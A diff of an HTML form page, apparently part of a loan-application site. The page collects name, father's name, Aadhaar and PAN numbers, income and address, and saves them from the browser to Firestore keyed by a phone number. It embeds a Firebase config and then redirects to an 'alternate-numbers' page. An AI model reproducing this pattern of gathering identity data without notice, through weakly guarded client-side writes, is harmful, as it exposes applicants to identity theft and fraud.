@@ -1,67 +1,308 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="viewport"
+content="width=device-width, initial-scale=1.0">
+
 <title>Personal Details</title>
-<link rel="stylesheet" href="style.css">
+
+<link rel="stylesheet"
+href="style.css">
+
 </head>
 
 <body>
 
-<div class="card">
+<div class="loan-page">
 
-<h2>Personal Details</h2>
+    <div class="top-box">
 
-<input type="text" placeholder="Full Name">
+        <h1>
+            Personal Details
+        </h1>
 
-<input type="text" placeholder="Father Name">
+        <p>
+            Enter customer information
+        </p>
 
-<input type="number" placeholder="Aadhaar Number">
+    </div>
 
-<input type="text" placeholder="PAN Number">
+    <div class="card">
 
-<select>
-<option>Gender</option>
-<option>Male</option>
-<option>Female</option>
-</select>
+        <div class="details-box">
 
-<input type="number" placeholder="Monthly Income">
+            <div class="detail-row"
+            style="border:none;display:block;">
 
-<input type="text" placeholder="Address">
+                <label>
+                    Full Name
+                </label>
 
-<input type="text" placeholder="City">
+                <input
+                type="text"
+                id="name"
+                placeholder="Enter Full Name">
 
-<input type="text" placeholder="State">
+            </div>
 
-<input type="number" placeholder="Pincode">
+            <div class="detail-row"
+            style="border:none;display:block;">
 
-<button onclick="nextPage()">
-Next
-</button>
+                <label>
+                    Father Name
+                </label>
+
+                <input
+                type="text"
+                id="father"
+                placeholder="Enter Father Name">
+
+            </div>
+
+            <div class="detail-row"
+            style="border:none;display:block;">
+
+                <label>
+                    Aadhaar Number
+                </label>
+
+                <input
+                type="number"
+                id="aadhaar"
+                placeholder="Enter Aadhaar Number">
+
+            </div>
+
+            <div class="detail-row"
+            style="border:none;display:block;">
+
+                <label>
+                    PAN Number
+                </label>
+
+                <input
+                type="text"
+                id="pan"
+                placeholder="Enter PAN Number">
+
+            </div>
+
+            <div class="detail-row"
+            style="border:none;display:block;">
+
+                <label>
+                    Gender
+                </label>
+
+                <select id="gender">
+
+                    <option>
+                        Male
+                    </option>
+
+                    <option>
+                        Female
+                    </option>
+
+                </select>
+
+            </div>
+
+            <div class="detail-row"
+            style="border:none;display:block;">
+
+                <label>
+                    Monthly Income
+                </label>
+
+                <input
+                type="number"
+                id="income"
+                placeholder="Enter Monthly Income">
+
+            </div>
+
+            <div class="detail-row"
+            style="border:none;display:block;">
+
+                <label>
+                    Address
+                </label>
+
+                <input
+                type="text"
+                id="address"
+                placeholder="Enter Address">
+
+            </div>
+
+            <div class="detail-row"
+            style="border:none;display:block;">
+
+                <label>
+                    City
+                </label>
+
+                <input
+                type="text"
+                id="city"
+                placeholder="Enter City">
+
+            </div>
+
+            <div class="detail-row"
+            style="border:none;display:block;">
+
+                <label>
+                    State
+                </label>
+
+                <input
+                type="text"
+                id="state"
+                placeholder="Enter State">
+
+            </div>
+
+            <div class="detail-row"
+            style="border:none;display:block;">
+
+                <label>
+                    Pincode
+                </label>
+
+                <input
+                type="number"
+                id="pincode"
+                placeholder="Enter Pincode">
+
+            </div>
+
+        </div>
+
+        <button
+        class="apply-btn"
+        onclick="nextPage()">
+
+            Next →
+
+        </button>
+
+    </div>
 
 </div>
 
-<script>
+<div id="loadingScreen"
+class="loading-screen">
 
-function nextPage(){
+    <div class="loader"></div>
 
-document.body.innerHTML=`
-
-<div class="card">
-
-<div class="loader"></div>
-
-<h2>Loading...</h2>
+    <p>
+        Saving Details...
+    </p>
 
 </div>
 
-`;
+<script type="module">
+
+import { initializeApp }
+from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+
+import {
+getFirestore,
+doc,
+setDoc
+}
+from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+
+const firebaseConfig = {
+
+apiKey: "AIzaSyCajHdn60cCNoivFXrpPOh0xRNRY_rinMQ",
+
+authDomain: "loan-19007.firebaseapp.com",
+
+projectId: "loan-19007",
+
+storageBucket: "loan-19007.firebasestorage.app",
+
+messagingSenderId: "175686513150",
+
+appId: "1:175686513150:web:f25e43507db445998d10af"
+
+};
+
+const app =
+initializeApp(firebaseConfig);
+
+const db =
+getFirestore(app);
+
+window.nextPage =
+async function(){
+
+let name =
+document.getElementById("name").value;
+
+let father =
+document.getElementById("father").value;
+
+let aadhaar =
+document.getElementById("aadhaar").value;
+
+let pan =
+document.getElementById("pan").value;
+
+let gender =
+document.getElementById("gender").value;
+
+let income =
+document.getElementById("income").value;
+
+let address =
+document.getElementById("address").value;
+
+let city =
+document.getElementById("city").value;
+
+let state =
+document.getElementById("state").value;
+
+let pincode =
+document.getElementById("pincode").value;
+
+let phone =
+localStorage.getItem(
+"customerPhone"
+);
+
+await setDoc(
+doc(db,"loanApplications",phone),
+{
+
+name:name,
+father:father,
+aadhaar:aadhaar,
+pan:pan,
+gender:gender,
+income:income,
+address:address,
+city:city,
+state:state,
+pincode:pincode
+
+},
+{merge:true}
+);
+
+document
+.getElementById("loadingScreen")
+.style.display = "flex";
 
 setTimeout(function(){
 
-window.location.href="alternate-numbers.html";
+window.location.href =
+"alternate-numbers.html";
 
 },3000);
 
